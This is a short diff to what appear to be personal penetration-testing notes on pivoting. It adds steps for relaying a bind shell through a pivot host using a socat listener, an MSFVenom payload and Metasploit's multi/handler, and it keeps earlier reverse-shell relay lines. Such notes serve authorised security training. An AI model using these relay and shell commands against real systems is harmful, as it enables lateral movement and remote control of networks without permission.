@@ -269,5 +269,9 @@ $ socat TCP4-LISTEN:<payload_traffic_port>, fork TPC4:<attack_host>:<port>
 3. Transfer the payload to the target system and execute, catch the reverse shell with the listener
 
 ### Using [[Socat]] redirection for Bind Shells
-1. Generate the bind shell payload (*specify the port to receive the connection on*)
-2. 
+1. Generate the bind shell payload (*specify the port to receive the connection on*) - [[MSFVenom]]
+2. Start the [[Socat]] bind shell listener on the pivot host
+```sh
+$ socat TCP4-LISTEN:<pivot_host_port>, fork TCP4:<target_host>:<port_of_bind_shell>
+```
+3. Start the bind shell listener on the attack machine that targets the pivot host's IP & port - [[Metasploit]] : `multi/handler`
